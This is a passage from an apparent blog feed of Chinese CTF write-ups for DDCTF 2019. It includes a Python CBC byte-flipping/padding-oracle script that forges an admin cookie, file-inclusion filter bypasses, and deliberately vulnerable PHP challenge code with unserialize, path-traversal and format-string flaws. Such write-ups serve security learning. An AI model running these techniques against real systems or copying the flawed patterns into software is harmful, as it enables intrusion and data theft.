class="title">get_api</span><span class="params">(ciphertext)</span>:</span></span><br><span class="line">    req_header=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">''</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063'</span>,</span><br><span class="line"><span class="string">'Host'</span>:<span class="string">'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>:<span class="string">'token=&#123;&#125;'</span>.format(ciphertext.decode(<span class="string">'hex'</span>).encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>]),</span><br><span class="line">&#125;</span><br><span class="line">    s = requests.session() </span><br><span class="line">    rsp=s.get(<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token'</span>, headers=req_header,timeout=<span class="number">2</span>,verify=<span class="keyword">False</span>,stream=<span class="keyword">True</span>,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">return</span>(rsp.content)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_byte_flipping</span><span class="params">(strings)</span>:</span></span><br><span class="line">    token_padding=padding(strings)</span><br><span class="line">    c2=<span class="string">'b8d85a91bdeae799086cc723e7bf1685'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    c2_m=<span class="string">'a7d3878a0466c70b59264b5ed33f5013'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">    c1=xor(c2_m,token_padding[<span class="number">16</span>:])</span><br><span class="line">    c1_m=padding_oracle(c1.encode(<span class="string">'hex'</span>), <span class="number">16</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    iv=xor(c1_m,token_padding[<span class="number">0</span>:<span class="number">16</span>]) <span class="comment">#iv</span></span><br><span class="line">    <span class="keyword">return</span>((iv+c1+c2).encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>])</span><br><span class="line">print(cbc_byte_flipping(<span class="string">'&#123;"id":1,"roleAdmin":true&#125;'</span>))</span><br></pre></td></tr></table></figure><img src="/2019/04/29/2019ddctf-unsolved-writeup/12.png"><p>è¿™é‡Œå€Ÿç”¨chamd5çš„wpè„šæœ¬ï¼Œåˆ©ç”¨ä¼ªé€ çš„cookieæˆ‘ä»¬ææƒæˆä¸ºadminï¼Œèƒ½ä¸‹è½½åˆ°ä¸€ä¸ªtxtã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Try to hack~ </span><br><span class="line">Hint:</span><br><span class="line">1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ </span><br><span class="line">2. You can not exec commands~</span><br></pre></td></tr></table></figure><p>åé¢åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ä¸‹è½½çš„apiå¯ä»¥è¯»å–æ–‡ä»¶ï¼Œåœ¨<code>/proc/self/fd/15</code>å¯ä»¥è¯»åˆ°jaråŒ…ï¼Œä¹‹åå°±æ˜¯javaçš„éƒ¨åˆ†äº†ï¼ŒGGã€‚å®˜æ–¹çš„æç¤ºæ˜¯<code>jrmp</code>ï¼Œæœ€åçœ‹wpæ˜¯ç”¨çš„Weblogic JRMPååºåˆ—åŒ–æ¼æ´æ‰“å‡ºæ¥çš„ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a></p><p><a href="https://www.zhaoj.in/read-5269.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5269.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485734&amp;idx=1&amp;sn=4d5c92902ece0db4eb29c0addecdb679&amp;chksm=e89e21fedfe9a8e89b42bf1df92ab8907c866df112c4c86bce8a38eafb3d90de9109e6c03516&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1556023454&amp;ascene=7&amp;devicetype=android-28&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AX5keAM2ZHgDamR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=YMjuQzyV9NBheOwb57Q7IzReaZd3gLT38Yu%252B%252FFcSC8KUJPp78f35Uw%252BPwVZ25nDA&amp;wx_header=1" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485734&amp;idx=1&amp;sn=4d5c92902ece0db4eb29c0addecdb679&amp;chksm=e89e21fedfe9a8e89b42bf1df92ab8907c866df112c4c86bce8a38eafb3d90de9109e6c03516&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1556023454&amp;ascene=7&amp;devicetype=android-28&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AX5keAM2ZHgDamR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=YMjuQzyV9NBheOwb57Q7IzReaZd3gLT38Yu%252B%252FFcSC8KUJPp78f35Uw%252BPwVZ25nDA&amp;wx_header=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;homebrew-event-loop&quot;&gt;&lt;a href=&quot;#homebrew-event-loop&quot; class=&quot;headerlink&quot; title=&quot;homebrew event loop&quot;&gt;&lt;/a&gt;homebrew event loop&lt;/h2&gt;&lt;p&gt;ä¸€é“
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019DDCTF éƒ¨åˆ†æˆ‘è§£å†³çš„é¢˜ç›®writeup</title>
    <link href="https://hurricane618.me/2019/04/19/2019ddctf-my-solutions-writeup/"/>
    <id>https://hurricane618.me/2019/04/19/2019ddctf-my-solutions-writeup/</id>
    <published>2019-04-19T12:42:51.000Z</published>
    <updated>2019-04-19T13:44:03.905Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘å¾—è¯´DDCTFçœŸçš„æ˜¯è„‘æ´å¤ªå¤§ï¼Œä¸€è¨€éš¾å°½ã€‚ã€‚ã€‚ </p><h2 id="æ»´"><a href="#æ»´" class="headerlink" title="æ»´~"></a>æ»´~</h2><p>æ–‡ä»¶åŒ…å«ï¼Œéœ€è¦ä¸€äº›è½¬æ¢ã€‚è½¬æˆhexå€¼ä¹‹åä¸¤æ¬¡base64ã€‚ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">import</span> binascii </span><br><span class="line"></span><br><span class="line">text = raw_input(<span class="string">'text: '</span>) </span><br><span class="line">text = binascii.b2a_hex(text) </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> text </span><br><span class="line"><span class="keyword">print</span> base64.b64encode(base64.b64encode(text))</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°index.phpæºç  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">\* https://blog.csdn.net/FengBanLiuYun/article/details/80616607 </span></span><br><span class="line"><span class="comment">\* Date: July 4,2018 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE); </span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>); </span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>); </span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>]))); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>; </span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file); </span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>; </span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file); </span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>; </span><br><span class="line">$txt = base64_encode(file_get_contents($file)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>; </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">\* Can you find the flag file? </span></span><br><span class="line"><span class="comment">\* </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sbçš„é¢˜ç›®ã€‚ã€‚å‡¸(è‰¹çš¿è‰¹ ) æœ€åæ˜¯çœ‹å…¶ä»–äººæç¤ºçš„<code>practice.txt.swp</code>ï¼Œå¾—åˆ°hintï¼Œflagçš„æ–‡ä»¶åä¸º<code>f1lg!ddctf.php</code>ã€‚è¿™æ ·çš„è¯ç»“åˆä¸Šé¢çš„æ›¿æ¢å°±å¯ä»¥ç»•è¿‡æ­£åˆ™çš„è¿‡æ»¤ã€‚ã€‚ã€‚æ˜æ˜¾çš„ä¸ºäº†å‡ºé¢˜è€Œå‡ºé¢˜ï¼Œå¼ºè¡Œæ„é€ çš„ç•¸å½¢é¢˜ç›®ã€‚ </p><p>æœ€åæäº¤<code>f1lgconfigddctf.php</code>ï¼Œå°±èƒ½æ‹¿åˆ°æºç ã€‚ </p><p>ä¹‹åçœ‹å…¶ä»–äººçš„WPï¼Œæ‰å‘ç°æ˜¯é€šè¿‡æºç ä¸­ç»™çš„é“¾æ¥æœç´¢åˆ°å…¶ä»–æ–‡ç« ä¸­çš„æç¤ºï¼Œåœ¨viç¼–è¾‘å™¨éæ­£å¸¸é€€å‡ºä¹‹åä¼šæœ‰swpæ–‡ä»¶æ®‹ç•™ï¼Œè¿™æ–‡ç« å°±æœ‰ä¸€ä¸ªä¾‹å­ã€‚ã€‚ã€‚æ— åŠ›åæ§½è¿™ä¸ªè„‘æ´ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>); </span><br><span class="line">$k = <span class="string">'hello'</span>; </span><br><span class="line">extract($_GET); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid)) </span><br><span class="line">&#123; </span><br><span class="line">    $content=trim(file_get_contents($k)); </span><br><span class="line">    <span class="keyword">if</span>($uid==$content) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">'hello'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¥½å§ç»§ç»­çœ‹<code>hello</code>ï¼Œå‘ç°æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆuidä¹Ÿä¸ºç©ºå°±å¯ä»¥äº†ï¼Œç›´æ¥æäº¤<code>uid=</code>ï¼Œæ‹¿åˆ°flagã€‚æ€»ç»“ä¸€ä¸‹ï¼Œsbçš„é¢˜ç›®ã€‚ </p><p>DDCTF{436f6e67726174756c6174696f6e73} </p><p>ä¹‹åå‘ç°è¿™é‡Œ<code>extract</code>æ³¨å†Œäº†å˜é‡ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨å˜é‡è¦†ç›–çš„æ€è·¯æ¥å¤„ç†è¿™é“é¢˜ã€‚æ¯”å¦‚<code>k</code>è®¾ç½®æˆæˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„æŸä¸ªæ–‡ä»¶ï¼Œç„¶å<code>uid</code>å†è®¾ç½®æˆç›¸åº”çš„å€¼ã€‚ </p><h2 id="WEB-ç­¾åˆ°é¢˜"><a href="#WEB-ç­¾åˆ°é¢˜" class="headerlink" title="WEB ç­¾åˆ°é¢˜"></a>WEB ç­¾åˆ°é¢˜</h2><p>é¦–å…ˆçœ‹åˆ°æ²¡æœ‰æƒé™çš„æç¤ºï¼Œçœ‹äº†ä¸€éæ–‡ä»¶ï¼Œå‘ç°æœ‰ajaxè¯·æ±‚ï¼Œç„¶åå®ƒçš„ddctf_usernameè®¾ç½®ä¸ºç©ºï¼Œçœ‹æ¥æ˜¯è¦è®¾ç½®ä¸€ä¸ªå€¼æ‰è¡Œï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è‡ªå·±çš„ç”¨æˆ·åï¼Œæœ€åè¯•å‡ºæ¥çš„<code>admin</code>ï¼Œç»™äº†å¦å¤–ä¸€ä¸ªè·¯å¾„ã€‚ </p><p>è®¿é—®ä¹‹åç»™äº†æºç ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app/Application.php </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123; </span><br><span class="line"><span class="keyword">var</span> $path = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123; </span><br><span class="line">$ret = [<span class="string">'errMsg'</span> =&gt; $errMsg, </span><br><span class="line">        <span class="string">'data'</span> =&gt; $data]; </span><br><span class="line">$ret = json_encode($ret); </span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>); </span><br><span class="line"><span class="keyword">echo</span> $ret; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123; </span><br><span class="line">$DIDICTF_ADMIN = <span class="string">'admin'</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;response(<span class="string">'æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php'</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">TRUE</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;response(<span class="string">'æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----'</span>,<span class="string">'error'</span>); </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">$path = trim($path); </span><br><span class="line">$path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path); </span><br><span class="line">$path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path); </span><br><span class="line"><span class="keyword">return</span> $path; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); </span><br><span class="line">    <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123; <span class="comment">// pathé•¿åº¦å¿…é¡»ä¸º18 ....//././config/flag </span></span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">app/Session.php </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123; </span><br><span class="line"><span class="comment">//keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸² </span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration = <span class="number">7200</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_name = <span class="string">'ddctf_id'</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_path = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_domain = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">var</span> $cookie_secure = <span class="keyword">FALSE</span>; </span><br><span class="line">    <span class="keyword">var</span> $activity = <span class="string">"DiDiCTF"</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;get_key(); <span class="comment">// ../config/key.txt çš„å†…å®¹ </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123; </span><br><span class="line">            $data = <span class="string">'DiDI Welcome you %s'</span>; </span><br><span class="line">            $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]); </span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;session_create(); </span><br><span class="line">            $data = <span class="string">'DiDI Welcome you'</span>; </span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="comment">//eancrykey and flag under the folder </span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;eancrykey = file_get_contents(<span class="string">'../config/key.txt'</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name]; <span class="comment">//ddctf_id </span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123; </span><br><span class="line">         <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>); </span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hash = substr($session,strlen($session)<span class="number">-32</span>); <span class="comment">// æœ€å32ä½ä¸ºhash </span></span><br><span class="line">    $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>); <span class="comment">// å‰é¢ä¸ºsession </span></span><br><span class="line">    <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123; <span class="comment">// åšéªŒè¯ </span></span><br><span class="line">        <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">$session = unserialize($session); <span class="comment">//è§¦å‘ååºåˆ—åŒ–è¯»æ–‡ä»¶ </span></span><br><span class="line">    <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123; </span><br><span class="line">        $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey); </span><br><span class="line">        $data = <span class="string">"Welcome my friend %s"</span>; </span><br><span class="line">        <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123; </span><br><span class="line">            $data = sprintf($data,$v); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123; </span><br><span class="line">        <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123; </span><br><span class="line">        <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">TRUE</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    $sessionid = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123; </span><br><span class="line">        $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax()); </span><br><span class="line">    &#125; </span><br><span class="line">    $userdata = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)), </span><br><span class="line">        <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>], </span><br><span class="line">        <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], </span><br><span class="line">        <span class="string">'user_data'</span> =&gt; <span class="string">''</span>, </span><br><span class="line"></span><br><span class="line">    ); </span><br><span class="line">    $cookiedata = serialize($userdata); </span><br><span class="line">    $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata); </span><br><span class="line">    $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time(); </span><br><span class="line">    setcookie( </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_name, </span><br><span class="line">        $cookiedata, </span><br><span class="line">        $expire, </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_path, </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_domain, </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cookie_secure </span><br><span class="line">    ); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session(); </span><br><span 